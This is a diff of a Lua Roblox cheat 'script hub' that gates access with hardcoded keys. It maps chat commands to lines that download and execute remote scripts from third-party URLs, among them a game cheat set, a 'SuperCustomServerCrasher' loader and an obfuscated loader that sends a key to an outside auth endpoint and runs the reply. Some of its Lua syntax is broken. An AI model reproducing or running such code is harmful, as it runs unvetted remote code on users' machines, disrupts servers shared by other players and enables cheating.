@@ -1,15 +1,15 @@
 print("🔥Flame-Script-Hub🔥 Checking Key...")
 wait()
-if Key == "kdw7G6g7-huyg766N-3877mds" then do
+if Key == "uJu58hGH76hf8h786HGHH7yjfhhy78" then do
 print("🔥Flame-Script-Hub🔥 Key Accepted!")
 end elseif 
 print("🔥Flame-Script-Hub🔥 Key Is Not Vaild")
 then end
-if Key == "kdw7G6g7-huyg766N-3877mds" then do
+if Key == "uhhg77278YUG87h7fh-Buiy7BN7UHDFjh8836Yn" then do
 wait()
 print("🔥Flame-Script-Hub🔥 Checking Version...")
 wait()
-if Version == "V1.8" then do
+if Version == "V1.9" then do
 print("🔥Flame-Script-Hub🔥 Version Matched!")
 wait()
 print("🔥Flame-Script-Hub🔥 Type A Command To Load A Script!")
@@ -28,6 +28,7 @@ end)
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == tpsg then
+        print("🔥Flame-Script-Hub🔥 Bang Activated.")
 tps = true
 repeat
     wait(waitb)
@@ -39,6 +40,7 @@ end
 end)
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == tpss then
+        print("🔥Flame-Script-Hub🔥 Bang Deactivated.")
 tps = false
 end
 end)
@@ -46,13 +48,15 @@ end)
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == a then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
+print("🔥Flame-Script-Hub🔥 Da Hood Script Executed.")
 end
 end)
 
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == b then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SwordFactoryX.lua"))()
+        print("🔥Flame-Script-Hub🔥 Sword Factory Script Executed.")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end
 end)
 
@@ -70,34 +74,33 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 getgenv().mainKey = "nil"
 wait(10)
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
-print("Eclipse Loaded Successfully!")
+print("🔥Flame-Script-Hub🔥 Eclipse Loaded Successfully!")
 wait()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/WarriorCrystal/WarriorHub/main/Load.lua"))()
-print("WarriorHub Loaded Successfully!")
+print("🔥Flame-Script-Hub🔥 WarriorHub Loaded Successfully!")
 wait()
-while true do
-    wait()
-    print("All Scripts Have Been Loaded!")
-end
+print("🔥Flame-Script-Hub🔥 Booga Booga Script Executed.")
 end
 end)
 
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == e then
+        print("🔥Flame-Script-Hub🔥 Arsenal Script Executed.")
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
 end
 end)
 
-
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
-    if msg == e then
+    if msg == f then
+        print("🔥Flame-Script-Hub🔥 Anti-AFK Script Executed.")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
 end
 end)
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == g then
+        print("🔥Flame-Script-Hub🔥 Big/Small Scripted Activated.")
 local Humanoid = game.Players.LocalPlayer.Character.Humanoid;
 game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy()
 game.Players.LocalPlayer.Character.Head.FaceCenterAttachment.OriginalPosition:Destroy()
@@ -360,6 +363,7 @@ end)
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == h then
+        print("🔥Flame-Script-Hub🔥 Kaiju Paradise Script Executed.")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RealZzHub/MainV2/main/Main.lua"))()
 end
 end)
@@ -367,6 +371,7 @@ end)
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == i then
+print("🔥Flame-Script-Hub🔥 Jail Break Script Executed.")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))()
 end
 end)
